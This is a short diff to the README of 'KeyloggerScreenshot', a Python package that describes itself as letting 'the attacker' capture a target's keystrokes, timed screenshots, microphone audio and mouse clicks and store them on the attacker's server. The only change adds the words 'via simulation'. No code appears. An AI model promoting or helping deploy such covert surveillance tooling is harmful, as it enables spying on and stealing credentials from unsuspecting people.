@@ -4,7 +4,7 @@ KeyloggerScreenshot
 
 Created by: Fawaz Bashiru
 
-KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Every mouse click will be represented at the server. Follow the instructions to build your own server in "KeyloggerScreenshot"
+KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Every mouse click will be represented at the server via simulation. Follow the instructions to build your own server in "KeyloggerScreenshot"
 
 check out my pypi page:
 https://pypi.org/project/KeyloggerScreenshot/
